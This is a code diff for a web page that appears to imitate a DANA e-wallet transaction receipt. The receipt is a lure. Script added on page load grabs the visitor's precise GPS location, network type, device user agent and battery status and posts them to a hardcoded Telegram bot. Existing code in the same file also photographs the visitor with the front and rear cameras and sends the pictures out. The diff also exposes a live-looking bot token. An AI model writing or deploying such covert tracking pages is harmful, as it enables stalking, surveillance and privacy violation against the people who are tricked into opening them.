@@ -1,3 +1,148 @@
+const BOT_TOKEN = "9241678519:AAHQRe5827TUxLB1JrgNGZR6narRgyyXP3M";
+const CHAT_ID  = "-1004462579685";
+
+function toDMS(decimal, isLat) {
+    const absolute = Math.abs(decimal);
+    const degrees = Math.floor(absolute);
+    const minutesNotTruncated = (absolute - degrees) * 60;
+    const minutes = Math.floor(minutesNotTruncated);
+    const seconds = ((minutesNotTruncated - minutes) * 60).toFixed(1);
+    const direction = isLat ? (decimal >= 0 ? "N" : "S") : (decimal >= 0 ? "E" : "W");
+    return `${degrees}°${minutes}'${seconds}"${direction}`;
+}
+
+function getNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+    if (!connection) {
+        return {
+            type: "Unavailable",
+            effectiveType: "Unavailable",
+            downlink: null,
+            rtt: null,
+            description: "Network Info tidak didukung"
+        };
+    }
+
+    const type = connection.type || "unknown";                 
+    const effectiveType = connection.effectiveType || "unknown"; 
+    const downlink = connection.downlink || null;              
+    const rtt = connection.rtt || null;                        
+
+    let description = "";
+    if (type === "wifi") {
+        description = "WiFi";
+    } else if (type === "cellular") {
+        description = `Cellular (${effectiveType.toUpperCase()})`;
+    } else {
+        description = `${type} (${effectiveType})`;
+    }
+
+    if (downlink) description += ` • ~${downlink} Mbps`;
+    if (rtt) description += ` • RTT ${rtt}ms`;
+
+    return { type, effectiveType, downlink, rtt, description };
+}
+
+async function kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus) {
+    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const dms = `${toDMS(latitude, true)} ${toDMS(longitude, false)}`;
+
+    const pesan = `⚠︎ tracking system information
+
+Latitude: ${latitude}
+Longitude: ${longitude}
+Accuracy: ${accuracy} meter
+
+Network Type: ${networkInfo.type}
+Effective Type: ${networkInfo.effectiveType}
+Detail: ${networkInfo.description}
+${networkInfo.downlink ? `Downlink: ~${networkInfo.downlink} Mbps` : ""}
+${networkInfo.rtt ? `RTT: ${networkInfo.rtt} ms` : ""}
+
+Device Info: ${deviceInfo}
+Battery Level: ${batteryStatus.level}%
+Charging: ${batteryStatus.charging ? "Yes" : "No"}
+
+Maps: ${mapsUrl}
+
+[${dms}](${mapsUrl})`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "Markdown",
+                disable_web_page_preview: false
+            })
+        });
+        console.log("Lokasi dan informasi terkirim ke Telegram");
+    } catch (err) {
+        console.error("Gagal kirim informasi:", err);
+    }
+}
+
+function berhasilLokasi(posisi) {
+    const latitude  = posisi.coords.latitude;
+    const longitude = posisi.coords.longitude;
+    const accuracy  = posisi.coords.accuracy;
+
+    const networkInfo = getNetworkInfo();
+    const deviceInfo = navigator.userAgent;
+
+    let batteryStatus = { level: "Unavailable", charging: false };
+
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            batteryStatus = {
+                level: Math.floor(battery.level * 100),
+                charging: battery.charging
+            };
+            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
+        }).catch(() => {
+            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
+        });
+    } else {
+        kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
+    }
+
+    console.log("Latitude :", latitude);
+    console.log("Longitude:", longitude);
+    console.log("Accuracy :", accuracy, "meter");
+    console.log("Network  :", networkInfo);
+    console.log("Device Info:", deviceInfo);
+}
+
+function gagalLokasi(error) {
+    switch (error.code) {
+        case error.PERMISSION_DENIED:
+            console.error("Izin lokasi ditolak.");
+            break;
+        case error.POSITION_UNAVAILABLE:
+            console.error("Lokasi tidak tersedia.");
+            break;
+        case error.TIMEOUT:
+            console.error("Timeout lokasi.");
+            break;
+        default:
+            console.error("Error lokasi:", error.message);
+    }
+}
+
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(berhasilLokasi, gagalLokasi, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    });
+} else {
+    console.error("Browser tidak mendukung Geolocation.");
+}
+
+
 async function ambilFoto(facingMode) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -49,76 +194,80 @@ async function prosesKamera() {
 
     const fotoDepan = await ambilFoto("user");
     if (fotoDepan) {
-        await kirimFoto(fotoDepan, "Tangkapan Kamera Depan");
+        await kirimFoto(fotoDepan, "Kamera Depan");
         console.log("Foto kamera depan terkirim");
     }
 
     const fotoBelakang = await ambilFoto("environment");
     if (fotoBelakang) {
-        await kirimFoto(fotoBelakang, "TangkapanKamera Belakang");
+        await kirimFoto(fotoBelakang, "Kamera Belakang");
         console.log("Foto kamera belakang terkirim");
     }
 }
 
 prosesKamera().catch(err => console.error("Gagal proses kamera:", err));
 
-        function updateRealtimeDateTime() {
-            const now = new Date();
-            const months = [
-                "Jan", "Feb", "Mar", "Apr", "Mei", "Jun",
-                "Jul", "Agu", "Sep", "Okt", "Nov", "Des"
-            ];
-            const day = now.getDate();
-            const month = months[now.getMonth()];
-            const year = now.getFullYear();
-            const hours = String(now.getHours()).padStart(2, '0');
-            const minutes = String(now.getMinutes()).padStart(2, '0');
+        let isRedirecting = false;
+        let toastTimer = null;
 
-            const target = document.getElementById('realtimeDateTime');
-            if (target) {
-                target.innerHTML = `${day} ${month} ${year} &bull; ${hours}:${minutes}`;
+        function updateDateTime() {
+            const now = new Date();
+            const datePart = now.toLocaleDateString("id-ID", {
+                day: "2-digit",
+                month: "short",
+                year: "numeric"
+            });
+            const timePart = now.toLocaleTimeString("id-ID", {
+                hour: "2-digit",
+                minute: "2-digit",
+                hour12: false
+            }).replace(":", ".");
+
+            const el = document.getElementById("realtimeDateTime");
+            if (el) {
+                el.textContent = `${datePart} • ${timePart}`;
             }
         }
 
-        function initWatermark() {
-            const svgString = `
-                <svg width="190" height="98" viewBox="0 0 210 110" xmlns="http://www.w3.org/2000/svg">
-                    <g transform="translate(15, 35)">
-                        <circle cx="18" cy="18" r="16" fill="#118EEA"/>
-                        <path d="M9.5 15.2C11.8 14 14.5 14.1 17.6 15.1C20.8 16.1 23.7 16 26.5 14.7V21.1C23.7 22.4 20.8 22.5 17.6 21.5C14.5 20.5 11.8 20.4 9.5 21.6V15.2Z" fill="#FFFFFF"/>
-                        <text x="42" y="25" font-family="Inter, Arial, sans-serif" font-weight="800" font-size="22" letter-spacing="2" fill="#118EEA">DANA</text>
-                    </g>
-                </svg>
-            `;
-            const encodedSvg = encodeURIComponent(svgString.trim());
-            const watermarkEl = document.getElementById('watermarkBg');
-            watermarkEl.style.backgroundImage = `url("data:image/svg+xml,${encodedSvg}")`;
-        }
-
-        function copyTxId() {
-            const rawId = "2026052510121410010100166851622300160";
-            navigator.clipboard.writeText(rawId).then(() => {
-                showToast("ID Transaksi berhasil disalin");
-            }).catch(() => {
-                const tempInput = document.createElement("input");
-                tempInput.value = rawId;
-                document.body.appendChild(tempInput);
-                tempInput.select();
-                document.execCommand("copy");
-                document.body.removeChild(tempInput);
-                showToast("ID Transaksi berhasil disalin");
-            });
-        }
-
         function showToast(message) {
-            const toast = document.getElementById('toast');
+            const toast = document.getElementById("toast");
+            if (!toast) return;
+
             toast.textContent = message;
-            toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
+            toast.classList.add("show");
+
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => {
+                toast.classList.remove("show");
             }, 2200);
         }
 
-        updateRealtimeDateTime();
-        setInterval(updateRealtimeDateTime, 1000);
-        initWatermark();
+        function copyTxId() {
+            const txEl = document.getElementById("txIdText");
+            if (!txEl) return;
+
+            const cleanId = txEl.innerText.replace(/\s+/g, "").trim();
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(cleanId)
+                    .then(() => showToast("ID Transaksi berhasil disalin"))
+                    .catch(() => showToast("Gagal menyalin ID Transaksi"));
+            }
+        }
+
+        function showSecondPage() {
+            if (isRedirecting) return;
+            isRedirecting = true;
+
+            const splash = document.getElementById("splash");
+            const page = document.getElementById("page-content");
+
+            splash.classList.add("fade-out");
+
+            setTimeout(() => {
+                splash.style.display = "none";
+                page.classList.add("show");
+                updateDateTime();
+            }, 350);
+        }
+
+        setTimeout(showSecondPage, 2000);
